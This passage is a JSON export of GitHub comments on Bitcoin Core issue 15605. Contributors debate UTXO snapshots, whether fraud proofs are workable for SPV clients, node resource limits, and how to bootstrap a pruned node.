         "avatar_url" : "https://avatars0.githubusercontent.com/u/4075106?v=4",
         "events_url" : "https://api.github.com/users/andronoob/events{/privacy}",
         "followers_url" : "https://api.github.com/users/andronoob/followers",
         "following_url" : "https://api.github.com/users/andronoob/following{/other_user}",
         "gists_url" : "https://api.github.com/users/andronoob/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/andronoob",
         "id" : 4075106,
         "login" : "andronoob",
         "node_id" : "MDQ6VXNlcjQwNzUxMDY=",
         "organizations_url" : "https://api.github.com/users/andronoob/orgs",
         "received_events_url" : "https://api.github.com/users/andronoob/received_events",
         "repos_url" : "https://api.github.com/users/andronoob/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/andronoob/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/andronoob/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/andronoob"
      }
   },
   {
      "author_association" : "NONE",
      "body" : "> I didn't believe it either, until I learned the story of fraud proofs.\r\n\r\nEnlighten us...\r\n\r\n> committing UTXO hash into the blockchain, by the miners, rather than the current proposal (hard-coded) which trusts the developers just like assumevalid.\r\n\r\nI see. I'm in support of that. However, I don't think it materially reduces trust in the UTXO hashes. If the software you're using is malicious, no amount of hashpower behind a UTXO hash will save you (because your software can simply decide to ignore it).",
      "created_at" : "2020-12-29T07:04:18Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-751973352",
      "id" : 751973352,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDc1MTk3MzM1Mg==",
      "performed_via_github_app" : null,
      "updated_at" : "2020-12-29T07:04:18Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/751973352",
      "user" : {
         "avatar_url" : "https://avatars3.githubusercontent.com/u/149531?v=4",
         "events_url" : "https://api.github.com/users/fresheneesz/events{/privacy}",
         "followers_url" : "https://api.github.com/users/fresheneesz/followers",
         "following_url" : "https://api.github.com/users/fresheneesz/following{/other_user}",
         "gists_url" : "https://api.github.com/users/fresheneesz/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/fresheneesz",
         "id" : 149531,
         "login" : "fresheneesz",
         "node_id" : "MDQ6VXNlcjE0OTUzMQ==",
         "organizations_url" : "https://api.github.com/users/fresheneesz/orgs",
         "received_events_url" : "https://api.github.com/users/fresheneesz/received_events",
         "repos_url" : "https://api.github.com/users/fresheneesz/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/fresheneesz/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/fresheneesz/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/fresheneesz"
      }
   },
   {
      "author_association" : "NONE",
      "body" : ">Enlighten us...\r\n\r\nI'm not sure whether I've misunderstood this topic either. I'll just try my best.\r\n\r\nThe idea of fraud proofs originated from Satoshi's whitepaper. Satoshi's whitepaper described that although SPV client cannot validate transactions on its own, it may still receive alarms from fully validating nodes, which points them to the position where something invalid appears, so that SPV client can then download & verify the pointed blocks on its own, to avoid blindly following an invalid chain with more PoW.\r\n\r\nFor example, if a transaction spends a spent coin once again, a fraud proof which consists of Merkle proofs of both the original transaction and the double-spending invalid transaction can be sent to SPV clients, then SPV clients can validate such proof without downloading blockchain, so finally SPV clients will know it's an invalid chain which shouldn't be followed.\r\n\r\nWe can see that the fraud proofs were supposed to work just like \"supervision by public opinion\" in real life, and even better, it was supposed to be \"fact-based\" rather than \"opinion-based\", because the fraud proofs were supposed to be succint, and, verifiable without the gigantic blockchain data.\r\n\r\nWith the help of fraud proofs, SPV was supposed to work almostly as secure as a fully validating node.\r\n\r\nHowever, such strategy has a fatal flaw: to generate a fraud proof, the invalid part of the block must be known in first place. If some part of a block can't be downloaded, you can't convince other people that it's impossible to fully download such block, other people must try downloading it on their own to see whether it's truly undownloadable.\r\n\r\nFor example, a normal valid block has its own Merkle tree, where each leaf node is hash of a valid transaction. If you put something which isn't a hash at all (so that it doesn't have any known preimage) into the Merkle tree, then nobody can provide the \"full block data\". Fully validating nodes won't accept such malformed blocks, but SPV clients will still blindly accept Merkle proofs of such malformed blocks. Fully validating nodes can't prove it's malformed either, at best SPV clients still needs to try downloading the specified block on their own, which on the other side becomes a DoS vector that attacker can send false alarms to trick SPV clients into downloading existing (valid) blocks, wasting their bandwidth, so that the goal of lightweight SPV client is destroyed.\r\n\r\nBack to the topic of fully validating node which just skips downloading the gigantic historical blockchain data: as long as you don't validate all blocks before the UTXO snapshot, you won't know whether some similar invalid/malformed things sneaked into those \"unknown\" blocks. You can't hope someone will alert you either, because you won't know whether it's a false alarm. With the default assumevalid situation, although you don't fully verify the contents of historical blocks either, it's still theoretically (it's theoretical for now, because there are cases which need some currently missing additional commitment structure, like: spending never existed UTXOs) possible to generate a fraud proof which contains objectively irrefutable evidence proving some block is violating the consensus rules.",
      "created_at" : "2020-12-29T14:19:10Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-752092712",
      "id" : 752092712,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDc1MjA5MjcxMg==",
      "performed_via_github_app" : null,
      "updated_at" : "2020-12-29T14:32:03Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/752092712",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/4075106?v=4",
         "events_url" : "https://api.github.com/users/andronoob/events{/privacy}",
         "followers_url" : "https://api.github.com/users/andronoob/followers",
         "following_url" : "https://api.github.com/users/andronoob/following{/other_user}",
         "gists_url" : "https://api.github.com/users/andronoob/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/andronoob",
         "id" : 4075106,
         "login" : "andronoob",
         "node_id" : "MDQ6VXNlcjQwNzUxMDY=",
         "organizations_url" : "https://api.github.com/users/andronoob/orgs",
         "received_events_url" : "https://api.github.com/users/andronoob/received_events",
         "repos_url" : "https://api.github.com/users/andronoob/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/andronoob/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/andronoob/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/andronoob"
      }
   },
   {
      "author_association" : "NONE",
      "body" : ">However, I don't think it materially reduces trust in the UTXO hashes. If the software you're using is malicious, no amount of hashpower behind a UTXO hash will save you (because your software can simply decide to ignore it).\r\n\r\nAFAIK, in Bitcoin, miners are not supposed to be trusted at all, let alone comparing to developers. I never mentioned that miners can reduce trust on developers (who hard-code UTXO hashes into the software - of course, they can do much more evil things than hard-coding malicious UTXO hashes).",
      "created_at" : "2020-12-29T14:39:33Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-752100893",
      "id" : 752100893,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDc1MjEwMDg5Mw==",
      "performed_via_github_app" : null,
      "updated_at" : "2020-12-29T14:42:50Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/752100893",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/4075106?v=4",
         "events_url" : "https://api.github.com/users/andronoob/events{/privacy}",
         "followers_url" : "https://api.github.com/users/andronoob/followers",
         "following_url" : "https://api.github.com/users/andronoob/following{/other_user}",
         "gists_url" : "https://api.github.com/users/andronoob/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/andronoob",
         "id" : 4075106,
         "login" : "andronoob",
         "node_id" : "MDQ6VXNlcjQwNzUxMDY=",
         "organizations_url" : "https://api.github.com/users/andronoob/orgs",
         "received_events_url" : "https://api.github.com/users/andronoob/received_events",
         "repos_url" : "https://api.github.com/users/andronoob/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/andronoob/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/andronoob/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/andronoob"
      }
   },
   {
      "author_association" : "NONE",
      "body" : "A lot of people think that after adding (a new consensus rule enforcing miners to provide on-chain) UTXO commitments (and then brand-new full nodes can skip downloading the gigantic historical blockchain data with the help of it), Bitcoin will work in **the same way** it has been working up till now. After all, every bitcoin transaction is confirmed by miners. Some people just disagree with this point - maybe @luke-jr is one of them, so that he commented \"Concept NACK, this significantly changes Bitcoin's security model\" above.\r\n\r\nIn my opinion, as long as a typical PC with common Internet connection is still **able** (not \"required\", \"forced\" etc) to fully validate the entire blockchain, skipping downloading the old blocks would be fine - after all, those old blocks have been repeatedly validated for tens of thousands of times.",
      "created_at" : "2020-12-29T14:52:17Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-752106400",
      "id" : 752106400,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDc1MjEwNjQwMA==",
      "performed_via_github_app" : null,
      "updated_at" : "2020-12-29T14:53:25Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/752106400",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/4075106?v=4",
         "events_url" : "https://api.github.com/users/andronoob/events{/privacy}",
         "followers_url" : "https://api.github.com/users/andronoob/followers",
         "following_url" : "https://api.github.com/users/andronoob/following{/other_user}",
         "gists_url" : "https://api.github.com/users/andronoob/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/andronoob",
         "id" : 4075106,
         "login" : "andronoob",
         "node_id" : "MDQ6VXNlcjQwNzUxMDY=",
         "organizations_url" : "https://api.github.com/users/andronoob/orgs",
         "received_events_url" : "https://api.github.com/users/andronoob/received_events",
         "repos_url" : "https://api.github.com/users/andronoob/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/andronoob/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/andronoob/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/andronoob"
      }
   },
   {
      "author_association" : "NONE",
      "body" : "> at best SPV clients still needs to try downloading the specified block on their own\r\n\r\nValid uses of this would be extraordinarily rare. Even 1 block per year would be far more frequent than is at all likely. The bandwidth needed is small, even for lightweight SPV nodes. \r\n\r\n> a DoS vector that attacker can send false alarms to trick SPV clients into downloading existing (valid) blocks, wasting their bandwidth\r\n\r\nThat's true, however there is already a way of dealing with bad behavior from connected nodes: disconnect from them. As long as the network of SPV servers is decentralized and honest nodes compose a significant fraction of those SPV servers, there's a pretty low limit of possible shenanigans. \r\n\r\nFor example, let's say your pool of SPV servers consists of 70% honest nodes, and 30% malicious actors. If your SPV node is connecting to 10 SPV servers, an average of 3 of them will be malicious and can send 3 fake fraud claims that results in 3 (extra) blocks of download. After disconnecting from those 3 jokers, an average of 1 of the 3 new SPV servers they connect to will be malicious, resulting in a 4th extra block download. The last new SPV node would not usually be malicious. That's 4 extra blocks, that hardly destroys the goal of having a lightweight node. \r\n\r\nSo even if you have a massive fraction of malicious nodes, you can't realy troll SPV nodes that hard as long as they're following best practices and disconnecting from nodes that give them bad data. \r\n\r\n> as long as a typical PC with common Internet connection is still able (not \"required\", \"forced\" etc) to fully validate the entire blockchain, skipping downloading the old blocks would be fine\r\n\r\nI think its very important that the Bitcoin community come to a consensus around bounadaries of what we consider \"safe\" as far as resource usage. What is the minimum resources of that \"typical PC with a common internet connection\"? If we need to support practical verifiability of the entire chain on  below-average machines with below average resources, we need to limit the blockchain's grow much more than if we decided we only need to support practical verifiability of the entire chain by \"average or better\" machines etc. Once we decide on the power of machines we think we need to support, we can then [calculate how big blocks can safely be](https://github.com/fresheneesz/bitcoinThroughputAnalysis).",
      "created_at" : "2020-12-29T21:24:43Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-752247084",
      "id" : 752247084,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDc1MjI0NzA4NA==",
      "performed_via_github_app" : null,
      "updated_at" : "2020-12-29T21:25:53Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/752247084",
      "user" : {
         "avatar_url" : "https://avatars3.githubusercontent.com/u/149531?v=4",
         "events_url" : "https://api.github.com/users/fresheneesz/events{/privacy}",
         "followers_url" : "https://api.github.com/users/fresheneesz/followers",
         "following_url" : "https://api.github.com/users/fresheneesz/following{/other_user}",
         "gists_url" : "https://api.github.com/users/fresheneesz/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/fresheneesz",
         "id" : 149531,
         "login" : "fresheneesz",
         "node_id" : "MDQ6VXNlcjE0OTUzMQ==",
         "organizations_url" : "https://api.github.com/users/fresheneesz/orgs",
         "received_events_url" : "https://api.github.com/users/fresheneesz/received_events",
         "repos_url" : "https://api.github.com/users/fresheneesz/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/fresheneesz/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/fresheneesz/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/fresheneesz"
      }
   },
   {
      "author_association" : "NONE",
      "body" : ">Valid uses of this would be extraordinarily rare. Even 1 block per year would be far more frequent than is at all likely. The bandwidth needed is small, even for lightweight SPV nodes.\n\nJust one rule-breaking transaction could already be catastrophic - like, minting 1 trillion coins out of thin air (it could be done through many ways, like, spending nonexistent UTXOs).\n\nIt's not about bargaining over bandwidth either. The point was that you can't know whether the alarm you received is a malicious false alarm. Even if you see a block failed to be downloaded, you can't convince others - \"oh, must be a temporary network connectivity issue, maybe you should just try again?\"\n\n>As long as the network of SPV servers is decentralized and honest nodes compose a significant fraction of those SPV servers\n\nJust like what Satoshi's whitepaper had outlined:\n\n>If the majority were based on one-IP-address-one-vote, it could be subverted by anyone\rable to allocate many IPs.\n\nMiners are not naturally honest or selfless - it's on the contrary expected for them to behave greedily, selfishly and rationally. Miners are just incentivised to behave honestly under the constraints of consensus rules, or in other words, game theory.\n\nMiners respect the consensus rules because they know other people will verify the blocks they mined according those rules - if they dare to let anything violating the rules sneak in, then no one will accept their hard-mined (costs expensive electricity in real world) block. \n\n(To be honest, AFAIK, there are disagreements around this point - some people believe that only miners should verify the blocks, while some other people believe that it's not only miners but the economic majority should also always verify the blocks)\n\n>I think its very important that the Bitcoin community come to a consensus around bounadaries of what we consider \"safe\" as far as resource usage. What is the minimum resources of that \"typical PC with a common internet connection\"? If we need to support practical verifiability of the entire chain on below-average machines with below average resources, we need to limit the blockchain's grow much more than if we decided we only need to support practical verifiability of the entire chain by \"average or better\" machines etc.\n\nAgreed.",
      "created_at" : "2020-12-30T02:38:58Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-752306543",
      "id" : 752306543,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDc1MjMwNjU0Mw==",
      "performed_via_github_app" : null,
      "updated_at" : "2020-12-30T02:41:40Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/752306543",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/4075106?v=4",
         "events_url" : "https://api.github.com/users/andronoob/events{/privacy}",
         "followers_url" : "https://api.github.com/users/andronoob/followers",
         "following_url" : "https://api.github.com/users/andronoob/following{/other_user}",
         "gists_url" : "https://api.github.com/users/andronoob/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/andronoob",
         "id" : 4075106,
         "login" : "andronoob",
         "node_id" : "MDQ6VXNlcjQwNzUxMDY=",
         "organizations_url" : "https://api.github.com/users/andronoob/orgs",
         "received_events_url" : "https://api.github.com/users/andronoob/received_events",
         "repos_url" : "https://api.github.com/users/andronoob/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/andronoob/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/andronoob/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/andronoob"
      }
   },
   {
      "author_association" : "NONE",
      "body" : "I see your point that successfully downloading a block proves that the alarm was a false one. However (let alone sybil attack) it still can't save the idea of fraud proofs, because even if you have failed to download a block, you are still not sure whether it's just some network connectivity issue - like the case of a stalled bittorrent which lacks seeders. In the end the alarm is still going to be ignored.",
      "created_at" : "2020-12-30T02:50:05Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-752308526",
      "id" : 752308526,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDc1MjMwODUyNg==",
      "performed_via_github_app" : null,
      "updated_at" : "2020-12-30T02:52:08Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/752308526",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/4075106?v=4",
         "events_url" : "https://api.github.com/users/andronoob/events{/privacy}",
         "followers_url" : "https://api.github.com/users/andronoob/followers",
         "following_url" : "https://api.github.com/users/andronoob/following{/other_user}",
         "gists_url" : "https://api.github.com/users/andronoob/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/andronoob",
         "id" : 4075106,
         "login" : "andronoob",
         "node_id" : "MDQ6VXNlcjQwNzUxMDY=",
         "organizations_url" : "https://api.github.com/users/andronoob/orgs",
         "received_events_url" : "https://api.github.com/users/andronoob/received_events",
         "repos_url" : "https://api.github.com/users/andronoob/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/andronoob/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/andronoob/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/andronoob"
      }
   },
   {
      "author_association" : "NONE",
      "body" : "> Just one rule-breaking transaction could already be catastrophic\r\n\r\nI think I know what you mean, but a rule-breaking transaction that inflates the supply of bitcoin is not relevant to fraud proofs. The rare event I was talking about in a bitcoin with fraud proofs would be where a majority of mining power tried to fork the blockchain in ways that would fool SPV nodes. If fraud proofs were in place, this would not only be incredibly difficult to pull of (as it would be without fraud proofs), but would also be unsuccessful. Without fraud proofs, such a scenario could succeed, and it could be catestrophic. \r\n\r\n> The point was that you can't know whether the alarm you received is a malicious false alarm. \r\n\r\nThat's simply not true. You download the accused block, you validate it, and then you know.\r\n\r\n> Even if you see a block failed to be downloaded, you can't convince others - \"oh, must be a temporary network connectivity issue, maybe you should just try again?\"\r\n\r\nIf a node can't download a block, then its invalid, full stop. You don't accept that a block is valid if you can't download it. Why would you? If someone can't download it, they should be very convinced that its not a valid block until shown otherwise. \r\n\r\n> In the end the alarm is still going to be ignored.\r\n\r\nIf you program the SPV node software to not ignore that, it won't be ignored. It would be a pretty stupid rule to ignore the fact that the data is not available. \r\n",
      "created_at" : "2020-12-30T08:21:39Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-752371545",
      "id" : 752371545,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDc1MjM3MTU0NQ==",
      "performed_via_github_app" : null,
      "updated_at" : "2020-12-30T08:21:39Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/752371545",
      "user" : {
         "avatar_url" : "https://avatars3.githubusercontent.com/u/149531?v=4",
         "events_url" : "https://api.github.com/users/fresheneesz/events{/privacy}",
         "followers_url" : "https://api.github.com/users/fresheneesz/followers",
         "following_url" : "https://api.github.com/users/fresheneesz/following{/other_user}",
         "gists_url" : "https://api.github.com/users/fresheneesz/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/fresheneesz",
         "id" : 149531,
         "login" : "fresheneesz",
         "node_id" : "MDQ6VXNlcjE0OTUzMQ==",
         "organizations_url" : "https://api.github.com/users/fresheneesz/orgs",
         "received_events_url" : "https://api.github.com/users/fresheneesz/received_events",
         "repos_url" : "https://api.github.com/users/fresheneesz/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/fresheneesz/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/fresheneesz/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/fresheneesz"
      }
   },
   {
      "author_association" : "NONE",
      "body" : "You can't know whether a block is downloadable (let alone its validity) **before** actually trying downloading it on your own. There are currently hundreds of thousands of historical blocks up till now, if some stranger tell you block XXXXXX can't be downloaded, what can you do? You must try downloading it on your own. Even if you can finally rule out all false alarms, you still have already paid expensive price.\n\nNot accepting a block is also not the same situation to rejecting a block, the later requires **known, clear evidence**. For example, a full node won't accept a valid block either, until it's fully downloaded & verified.\n\nIf you decide to mark a chain (which you haven't fully downloaded it) as invalid simply because you failed to download some blocks of it, probably a temporary network connectivity issue (which can be either unintentional or intentional/malicious) can effectively shut down your full node, which is even worse than being tricked into downloading (almostly) the entire blockchain.",
      "created_at" : "2020-12-30T09:58:04Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-752397485",
      "id" : 752397485,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDc1MjM5NzQ4NQ==",
      "performed_via_github_app" : null,
      "updated_at" : "2020-12-30T09:58:04Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/752397485",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/4075106?v=4",
         "events_url" : "https://api.github.com/users/andronoob/events{/privacy}",
         "followers_url" : "https://api.github.com/users/andronoob/followers",
         "following_url" : "https://api.github.com/users/andronoob/following{/other_user}",
         "gists_url" : "https://api.github.com/users/andronoob/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/andronoob",
         "id" : 4075106,
         "login" : "andronoob",
         "node_id" : "MDQ6VXNlcjQwNzUxMDY=",
         "organizations_url" : "https://api.github.com/users/andronoob/orgs",
         "received_events_url" : "https://api.github.com/users/andronoob/received_events",
         "repos_url" : "https://api.github.com/users/andronoob/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/andronoob/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/andronoob/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/andronoob"
      }
   },
   {
      "author_association" : "NONE",
      "body" : "@andronoob I disagree that your points support your proposition that fraud proofs aren't useful/workable. But I don't think this conversation is productive for this issue. If you want to keep discussing it, [PM me on reddit](https://www.reddit.com/user/fresheneesz).",
      "created_at" : "2020-12-30T19:02:56Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-752725661",
      "id" : 752725661,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDc1MjcyNTY2MQ==",
      "performed_via_github_app" : null,
      "updated_at" : "2020-12-30T19:03:34Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/752725661",
      "user" : {
         "avatar_url" : "https://avatars3.githubusercontent.com/u/149531?v=4",
         "events_url" : "https://api.github.com/users/fresheneesz/events{/privacy}",
         "followers_url" : "https://api.github.com/users/fresheneesz/followers",
         "following_url" : "https://api.github.com/users/fresheneesz/following{/other_user}",
         "gists_url" : "https://api.github.com/users/fresheneesz/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/fresheneesz",
         "id" : 149531,
         "login" : "fresheneesz",
         "node_id" : "MDQ6VXNlcjE0OTUzMQ==",
         "organizations_url" : "https://api.github.com/users/fresheneesz/orgs",
         "received_events_url" : "https://api.github.com/users/fresheneesz/received_events",
         "repos_url" : "https://api.github.com/users/fresheneesz/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/fresheneesz/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/fresheneesz/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/fresheneesz"
      }
   },
   {
      "author_association" : "NONE",
      "body" : "@fresheneesz I think it's more a theoretical problem rather than a practical one as well.\n\nThere's already a stackexchange question: https://bitcoin.stackexchange.com/questions/83422/is-the-idea-of-fraud-proofs-possible-in-reality",
      "created_at" : "2020-12-31T02:25:07Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-752819878",
      "id" : 752819878,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDc1MjgxOTg3OA==",
      "performed_via_github_app" : null,
      "updated_at" : "2020-12-31T02:25:07Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/752819878",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/4075106?v=4",
         "events_url" : "https://api.github.com/users/andronoob/events{/privacy}",
         "followers_url" : "https://api.github.com/users/andronoob/followers",
         "following_url" : "https://api.github.com/users/andronoob/following{/other_user}",
         "gists_url" : "https://api.github.com/users/andronoob/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/andronoob",
         "id" : 4075106,
         "login" : "andronoob",
         "node_id" : "MDQ6VXNlcjQwNzUxMDY=",
         "organizations_url" : "https://api.github.com/users/andronoob/orgs",
         "received_events_url" : "https://api.github.com/users/andronoob/received_events",
         "repos_url" : "https://api.github.com/users/andronoob/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/andronoob/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/andronoob/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/andronoob"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "(from IRC)\r\n\r\n> \\<jamesob> Do we ever expect to support an index that actually requires sequential indexing? Jimpo's BaseIndex advertises that it will index sequentially, but at the moment none of the particular indexers require this. Furthermore, we will have BlockConnected events triggering indexing out of order once we start using background chainstates for assumeutxo\r\n\r\nI don't think it affects when you're doing here, but I think of wallets as mini-indexes requiring sequential indexing. Wallets need to  scan blocks in sequential order so the [`IsFromMe`](https://github.com/bitcoin/bitcoin/blob/10eb000409a284b35b421818a11168adadaad4bd/src/wallet/wallet.cpp#L1046) check in `AddToWalletIfInvolvingMe`) will work. Eventually after #15719 I think wallets and indexes should use the same `interfaces::Chain` sync / rescan / block connected / rewind interface and hooks and work more efficiently together",
      "created_at" : "2021-07-21T10:34:06Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-884083671",
      "id" : 884083671,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "IC_kwDOABII5840sgvX",
      "performed_via_github_app" : null,
      "updated_at" : "2021-07-21T10:34:06Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/884083671",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/7133040?v=4",
         "events_url" : "https://api.github.com/users/ryanofsky/events{/privacy}",
         "followers_url" : "https://api.github.com/users/ryanofsky/followers",
         "following_url" : "https://api.github.com/users/ryanofsky/following{/other_user}",
         "gists_url" : "https://api.github.com/users/ryanofsky/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/ryanofsky",
         "id" : 7133040,
         "login" : "ryanofsky",
         "node_id" : "MDQ6VXNlcjcxMzMwNDA=",
         "organizations_url" : "https://api.github.com/users/ryanofsky/orgs",
         "received_events_url" : "https://api.github.com/users/ryanofsky/received_events",
         "repos_url" : "https://api.github.com/users/ryanofsky/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/ryanofsky/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/ryanofsky/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/ryanofsky"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "Regarding bootstrapping a pruned node from a full-node, the way I'd do it is to bitcoin-cli the running node to stop it accepting any more blocks or transactions, copy --reflink=always the block index and chainstate to a new bitcoind instance, bitcoin-cli the running node to resume accepting blocks and transactions, modify the new instance to use new ports, and enable pruning, and run it, wait for it to prune the block index, and then exit, and voila, I have a ready to copy bitcoind instance that I can install elsewhere.\r\n\r\nI'm not really sure it needs to be much more complicated than this, although ideally a way to do it without suspending activity on the main instance would be nice, but hardly worth it given the relatively little downtime the above method causes.",
      "created_at" : "2023-05-12T11:07:13Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-1545571482",
      "id" : 1545571482,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "IC_kwDOABII585cH4ya",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/1545571482/reactions"
      },
      "updated_at" : "2023-05-12T11:07:13Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/1545571482",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/1530283?v=4",
         "events_url" : "https://api.github.com/users/rebroad/events{/privacy}",
         "followers_url" : "https://api.github.com/users/rebroad/followers",
         "following_url" : "https://api.github.com/users/rebroad/following{/other_user}",
         "gists_url" : "https://api.github.com/users/rebroad/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/rebroad",
         "id" : 1530283,
         "login" : "rebroad",
         "node_id" : "MDQ6VXNlcjE1MzAyODM=",
